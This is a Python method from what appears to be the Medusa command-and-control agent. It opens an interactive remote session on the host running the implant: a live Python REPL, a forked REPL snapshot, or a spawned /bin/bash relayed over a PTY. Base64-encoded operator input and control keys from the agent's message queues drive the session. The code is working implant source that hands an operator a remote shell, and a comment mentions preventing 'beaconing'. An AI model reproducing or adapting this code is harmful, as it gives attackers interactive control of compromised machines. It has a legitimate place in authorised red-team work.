    def pty(self, task_id, program_path="/bin/bash", mode="spawn"):

        MSG_INPUT     = 0
        MSG_OUTPUT    = 1
        MSG_ERROR     = 2
        MSG_EXIT      = 3
        MSG_ESCAPE    = 4
        MSG_CTRL_A    = 5
        MSG_CTRL_B    = 6
        MSG_CTRL_C    = 7
        MSG_CTRL_D    = 8
        MSG_CTRL_E    = 9
        MSG_CTRL_F    = 10
        MSG_CTRL_G    = 11
        MSG_BACKSPACE = 12
        MSG_TAB       = 13
        MSG_CTRL_K    = 14
        MSG_CTRL_L    = 15
        MSG_CTRL_N    = 16
        MSG_CTRL_P    = 17
        MSG_CTRL_Q    = 18
        MSG_CTRL_R    = 19
        MSG_CTRL_S    = 20
        MSG_CTRL_U    = 21
        MSG_CTRL_W    = 22
        MSG_CTRL_Y    = 23
        MSG_CTRL_Z    = 24

        CTRL_BYTES = {
            MSG_ESCAPE:    b'\x1b',
            MSG_CTRL_A:    b'\x01',
            MSG_CTRL_B:    b'\x02',
            MSG_CTRL_C:    b'\x03',
            MSG_CTRL_D:    b'\x04',
            MSG_CTRL_E:    b'\x05',
            MSG_CTRL_F:    b'\x06',
            MSG_CTRL_G:    b'\x07',
            MSG_BACKSPACE: b'\x08',
            MSG_TAB:       b'\x09',
            MSG_CTRL_K:    b'\x0b',
            MSG_CTRL_L:    b'\x0c',
            MSG_CTRL_N:    b'\x0e',
            MSG_CTRL_P:    b'\x10',
            MSG_CTRL_Q:    b'\x11',
            MSG_CTRL_R:    b'\x12',
            MSG_CTRL_S:    b'\x13',
            MSG_CTRL_U:    b'\x15',
            MSG_CTRL_W:    b'\x17',
            MSG_CTRL_Y:    b'\x19',
            MSG_CTRL_Z:    b'\x1a',
        }

        def _send_interactive(data_bytes, msg_type):
            self.interactive_out.put({
                "task_id": task_id,
                "data": base64.b64encode(data_bytes).decode(),
                "message_type": msg_type,
            })

        # ── self mode: in-process Python REPL with live agent state ──
        if mode == "self":
            import code, io

            done = False
            console_locals = {
                "agent": self,
                "config": self.agent_config,
                "cwd": self.current_directory,
                "modules": self.moduleRepo,
                "task_id": task_id,
            }
            console = code.InteractiveConsole(locals=console_locals)

            _send_interactive(b"medusa REPL (in-process, live state)\n", MSG_OUTPUT)
            _send_interactive(b"Locals: agent, config, cwd, modules, task_id\n", MSG_OUTPUT)
            _send_interactive(b">>> ", MSG_OUTPUT)

            while not done:
                try:
                    msg = self.interactive_in.get(timeout=0.5)
                except:
                    continue
                if msg.get("task_id") != task_id:
                    self.interactive_in.put(msg)
                    time.sleep(0.1)
                    continue

                msg_type = msg.get("message_type", MSG_INPUT)
                raw_data = msg.get("data", "")

                if msg_type == MSG_EXIT or msg_type == MSG_CTRL_D:
                    done = True
                    break

                if msg_type == MSG_CTRL_C:
                    console.resetbuffer()
                    _send_interactive(b"\nKeyboardInterrupt\n>>> ", MSG_OUTPUT)
                    continue

                if msg_type == MSG_INPUT and raw_data:
                    text = base64.b64decode(raw_data).decode(errors="replace")
                    lines = text.split("\n")
                    if lines and lines[-1] == "":
                        lines = lines[:-1]
                    if not lines:
                        lines = [""]

                    for line in lines:
                        line = line.rstrip("\r")
                        old_out, old_err = sys.stdout, sys.stderr
                        capture = io.StringIO()
                        sys.stdout = sys.stderr = capture
                        try:
                            more = console.push(line)
                        except SystemExit:
                            done = True
                            break
                        finally:
                            sys.stdout, sys.stderr = old_out, old_err

                        output = capture.getvalue()
                        if output:
                            _send_interactive(output.encode(), MSG_OUTPUT)

                        prompt = b"... " if more else b">>> "
                        _send_interactive(prompt, MSG_OUTPUT)

            return "REPL session ended"

        # ── fork and spawn modes share the PTY I/O loop ──
        import select, struct, fcntl, termios

        if mode == "fork":
            import signal

            pid, master_fd = os.forkpty()

            if pid == 0:
                # Child: snapshot config for inspection, then wipe to prevent beaconing
                snapshot_config = dict(self.agent_config)
                self.agent_config = {}

                import code
                code.interact(
                    banner="medusa REPL (forked snapshot)\nLocals: agent, config, cwd, modules",
                    local={
                        "agent": self,
                        "config": snapshot_config,
                        "cwd": self.current_directory,
                        "modules": self.moduleRepo,
                    },
                )
                os._exit(0)

            # Parent: set up master_fd
            fcntl.fcntl(master_fd, fcntl.F_SETFL,
                        fcntl.fcntl(master_fd, fcntl.F_GETFL) | os.O_NONBLOCK)
            winsize = struct.pack('HHHH', 30, 80, 0, 0)
            fcntl.ioctl(master_fd, termios.TIOCSWINSZ, winsize)

            def _kill_child():
                try:
                    os.kill(pid, signal.SIGTERM)
                except:
                    pass

            def _wait_child():
                os.waitpid(pid, 0)

        else:
            # ── spawn mode (default): PTY + child process ──
            import pty as _pty, subprocess

            if not os.path.exists(program_path):
                return "Program not found: {}".format(program_path)

            master_fd, slave_fd = _pty.openpty()
            try:
                fcntl.fcntl(master_fd, fcntl.F_SETFL,
                            fcntl.fcntl(master_fd, fcntl.F_GETFL) | os.O_NONBLOCK)
                winsize = struct.pack('HHHH', 30, 80, 0, 0)
                fcntl.ioctl(slave_fd, termios.TIOCSWINSZ, winsize)

                proc = subprocess.Popen(
                    [program_path],
                    stdin=slave_fd,
                    stdout=slave_fd,
                    stderr=slave_fd,
                    preexec_fn=os.setsid,
                    env=os.environ.copy(),
                    cwd=self.current_directory,
                )
            except Exception as e:
                os.close(master_fd)
                os.close(slave_fd)
                return "Failed to start process: {}".format(str(e))

            os.close(slave_fd)

            def _kill_child():
                try:
                    proc.kill()
                except:
                    pass

            def _wait_child():
                proc.wait()

        # ── Shared PTY I/O bridging for fork and spawn ──
        done = False

        def _write_all(fd, data):
            mv = memoryview(data)
            while len(mv):
                try:
                    n = os.write(fd, mv)
                    mv = mv[n:]
                except BlockingIOError:
                    time.sleep(0.01)

        def _read_pty():
            buf = b""
            while not done:
                try:
                    r, _, _ = select.select([master_fd], [], [], 0.5)
                    if r:
                        chunk = os.read(master_fd, 4096)
                        if not chunk:
                            break
                        buf += chunk
                    else:
                        if buf:
                            _send_interactive(buf, MSG_OUTPUT)
                            buf = b""
                except OSError:
                    break
            if buf:
                _send_interactive(buf, MSG_OUTPUT)

        def _write_pty():
            nonlocal done
            while not done:
                try:
                    msg = self.interactive_in.get(timeout=0.5)
                except:
                    continue
                if msg.get("task_id") != task_id:
                    self.interactive_in.put(msg)
                    time.sleep(0.1)
                    continue
                msg_type = msg.get("message_type", MSG_INPUT)
                raw_data = msg.get("data", "")

                if msg_type == MSG_EXIT:
                    done = True
                    _kill_child()
                    return

                if msg_type == MSG_INPUT:
                    if raw_data:
                        data = base64.b64decode(raw_data)
                        _write_all(master_fd, data)
                elif msg_type in CTRL_BYTES:
                    ctrl = CTRL_BYTES[msg_type]
                    _write_all(master_fd, ctrl)
                    if raw_data:
                        data = base64.b64decode(raw_data)
                        _write_all(master_fd, data)

        reader = threading.Thread(target=_read_pty, daemon=True)
        writer = threading.Thread(target=_write_pty, daemon=True)
        reader.start()
        writer.start()

        _wait_child()
        done = True
        reader.join(timeout=2)
        writer.join(timeout=2)
        try:
            os.close(master_fd)
        except:
            pass
